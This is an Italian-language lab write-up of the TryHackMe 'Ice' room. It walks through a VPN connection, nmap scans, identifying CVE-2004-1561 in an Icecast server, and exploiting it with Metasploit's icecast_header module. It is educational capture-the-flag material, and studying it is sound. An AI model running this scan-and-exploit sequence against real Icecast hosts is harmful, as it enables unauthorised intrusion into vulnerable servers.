# Report: ICE room Tryhackme

Con questa repository, si vuole reportare il processo di scan di un IP target e l'exploiting di un payload malevolo sul server vulnerabile Icecast. 

**1. CONNESSIONE ALLA VPN**

**_Scaricamento del file di configurazione VPN_**

Il file di configurazione OpenVPN (.ovpn) è stato scaricato dalla sezione Accesso VPN della piattaforma TryHackMe dopo aver effettuato l’accesso con le credenziali personali.

**_Installazione di OpenVPN:_**

È stato verificato che OpenVPN fosse installato sul sistema eseguendo il comando:
```
openvpn --version
```

La connessione è stata avviata utilizzando il file di configurazione scaricato, con il seguente comando:
```
sudo openvpn --config <percorso_del_file>.ovpn
```

Per confermare il corretto instradamento del traffico attraverso la VPN, è stato controllato l’indirizzo IP.


**2. SCAN DELLA VITTIMA**

Una volta effettuato il collegamento alla VPN, dato un IP target denominato vittima, si effettua uno scan nmap con il comando:

```
nmap -v -T5 -Pn vittima
```
dove
``` -v ``` indica maggiore verbosità, ```-T5``` indica un livello di aggressività molto alto per la scansione, ottimizzando la velocità a scapito della precisione e del rischio di rilevamento da parte di sistemi di sicurezza, e ```-Pn``` disabilita il ping.

I risultati sono i seguenti:
![6577B4B3-A5DA-4F41-951E-5801E60E53D9_1_201_a](https://github.com/user-attachments/assets/8e952963-ea9f-4ef9-9c9d-742fa5548e44)

**Servizio Microsoft Remote Desktop (MSRDP)**

Dopo aver completato la scansione, si osservano diverse porte aperte sulla macchina. Il firewall risulta disattivato, con il servizio completamente spento, lasciando così la macchina esposta. 

La porta dedicata a Microsoft Remote Desktop (MSRDP)è la numero 3389.


**Servizio sulla porta 8000**

Nmap ha rilevato un servizio HTTP in esecuzione sulla porta 8000. 
Per identificare con precisione il servizio attivo sulla porta, si effettua la seguente scansione con nmap:
```
nmap -sV -Pn -T5 vittima
```
dove
```-sV```(Service Version Detection), identifica i servizi in esecuzione sulle porte aperte e tenta di determinare la versione specifica di ciascun servizio.```-T5``` indica un livello di aggressività molto alto per la scansione, ottimizzando la velocità a scapito della precisione e del rischio di rilevamento da parte di sistemi di sicurezza, e ```-Pn``` disabilita il ping.


![image](https://github.com/user-attachments/assets/ac2707da-1689-4430-94bd-4ce90d9f9ee7)

**Icecast Streaming Media Server**  

Icecast è un server open-source per lo streaming audio e video, ideale per creare radio online, trasmettere eventi live o distribuire contenuti multimediali. Supporta formati come MP3, Ogg Vorbis/Opus, AAC e WebM, ed è compatibile con Linux, macOS e Windows. Icecast offre scalabilità, relay streaming, controllo degli accessi e strumenti per monitorare le connessioni e le statistiche degli ascoltatori. È ampiamente usato per progetti di streaming grazie alla sua flessibilità e personalizzabilità.

**Host**

Il nome host DARK-PC della macchina è stato individuato con il comando 
```
nmap -sV -A vittima
```

Dove ```-sV``` Identifica le versioni dei servizi in esecuzione e ```-A``` abilita la scansione avanzata, inclusa l’identificazione del sistema operativo, il rilevamento del nome host e i traceroute.

![EA021DC2-74A4-485A-BBAD-F859CB3A6AC9_1_201_a](https://github.com/user-attachments/assets/906fdf6a-b817-4ffa-9ee1-3048e82b8eec)

**Server**





**3. ACCESSO AL SERVER ICECAST** 

Per cercare il CVE associato tramite una scansione delle vulnerabilità:
```
nmap --script vuln vittima
```
con il seguente risultato: CVE-2004-1561.

Una volta ottenuto il CVE, visitare _CVE Details_ e cercare il CVE specifico per ottenere l’Impact Score, pari a 6.4.

<img width="570" alt="Screenshot 2024-11-21 alle 16 43 43" src="https://github.com/user-attachments/assets/ed47bff8-62e4-49cc-87b9-66c5cde726d7">


**METASPLOIT E MSFCONFOLE**

**Metasploit Framework** è una piattaforma open-source utilizzata per test di penetrazione, ricerca di vulnerabilità e sviluppo di exploit. È uno strumento potente che permette di simulare attacchi informatici per identificare debolezze nei sistemi e migliorare la sicurezza.  

#### Termini chiave:  

- **Exploit:**  
  Un exploit è un codice o uno script progettato per sfruttare una vulnerabilità in un software, sistema operativo o servizio. In Metasploit, gli exploit vengono utilizzati per ottenere accesso non autorizzato o eseguire azioni malevole sul sistema target.

- **Payload:**  
  Il payload è il codice che viene eseguito una volta sfruttata la vulnerabilità. Può includere funzioni come:
  - Apertura di una shell remota
  - Download ed esecuzione di un file
  - Accesso ai dati sensibili
  I payload sono configurabili in Metasploit per adattarsi agli obiettivi specifici di un test di penetrazione.

- **Vulnerabilità:**  
  Una vulnerabilità è una debolezza in un sistema o applicazione che può essere sfruttata da un attaccante. Metasploit include un database di vulnerabilità e relativi exploit, rendendo più semplice identificare e testare falle di sicurezza note.

#### Workflow tipico in Metasploit:  
1. **Scansione e identificazione delle vulnerabilità** (spesso con strumenti come Nmap o Nessus).  
2. **Selezione di un exploit** appropriato per il target.  
3. **Configurazione del payload** da utilizzare con l'exploit.  
4. **Esecuzione dell'attacco** per testare la vulnerabilità e ottenere l'accesso.  


Si avvia il framework Metasploit con il seguente comando:
```
msfconsole
```

Una volta che la console è operativa, eseguire il comando:
``` 
search icecast
```
![df1e29e1-838e-4b24-bee1-2981f3f8b384](https://github.com/user-attachments/assets/a172f926-fc69-475f-a1ff-7a79e23a4b9a)

Nel risultato della ricerca, il modulo di exploit è indicato con:
```
exploit/windows/http/icecast_header
```

Si imposta il valore di LHOST (indirizzo IP locale) con l’IP di tun0 con il comando 
```
set lhost 10.10.7.72
```
per poi concludere l'esploit con il comando
```
exploit
```
<img width="580" alt="Screenshot 2024-11-21 alle 17 22 48" src="https://github.com/user-attachments/assets/3176e4f6-6071-4c2d-bbf4-a25c3b8aa204">



Nicoletta, Alessandra, Grazia <3







